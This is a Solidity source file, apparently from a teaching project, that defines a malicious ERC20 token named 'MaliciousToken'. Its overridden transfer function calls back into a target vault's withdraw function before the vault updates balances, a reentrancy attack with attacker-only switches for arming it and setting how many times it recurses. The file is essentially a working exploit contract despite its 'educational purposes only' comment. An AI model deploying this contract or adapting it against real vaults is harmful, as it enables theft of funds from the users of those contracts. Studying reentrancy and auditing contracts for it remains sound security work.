// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title MaliciousToken
 * @dev A malicious ERC20 token that demonstrates the reentrancy attack
 * @notice This is for EDUCATIONAL PURPOSES ONLY
 * 
 * This token exploits the vulnerability in TokenVault by calling back
 * into the withdraw function during the transfer, before the balance
 * is updated in the vault.
 */
contract MaliciousToken is ERC20 {
    address public vault;
    address public attacker;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    bool public attacking = false;
    
    constructor() ERC20("Malicious Token", "MAL") {
        attacker = msg.sender;
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    /**
     * @dev Set the vault address to attack
     * @param _vault Address of the TokenVault contract
     */
    function setVault(address _vault) external {
        require(msg.sender == attacker, "Only attacker can set vault");
        vault = _vault;
    }
    
    /**
     * @dev Set maximum number of recursive attacks
     * @param _maxAttacks Maximum number of attacks
     */
    function setMaxAttacks(uint256 _maxAttacks) external {
        require(msg.sender == attacker, "Only attacker can set max attacks");
        maxAttacks = _maxAttacks;
    }
    
    /**
     * @dev Enable attack mode
     */
    function enableAttack() external {
        require(msg.sender == attacker, "Only attacker can enable attack");
        attacking = true;
        attackCount = 0;
    }
    
    /**
     * @dev Disable attack mode
     */
    function disableAttack() external {
        require(msg.sender == attacker, "Only attacker can disable attack");
        attacking = false;
    }
    
    /**
     * @dev Overridden transfer function that performs reentrancy attack
     * @param to Recipient address
     * @param amount Amount to transfer
     * @return Boolean indicating success
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        // If we're in attack mode and haven't exceeded max attacks
        if (attacking && attackCount < maxAttacks && vault != address(0)) {
            attackCount++;
            
            // Reenter the vault's withdraw function
            // This will be called BEFORE the vault updates the balance
            (bool success, ) = vault.call(
                abi.encodeWithSignature("withdraw(address,uint256)", address(this), amount)
            );
            
            // Continue with normal transfer
            return super.transfer(to, amount);
        }
        
        // Normal transfer when not attacking
        return super.transfer(to, amount);
    }
    
    /**
     * @dev Reset attack counter
     */
    function resetAttackCount() external {
        require(msg.sender == attacker, "Only attacker can reset");
        attackCount = 0;
    }
}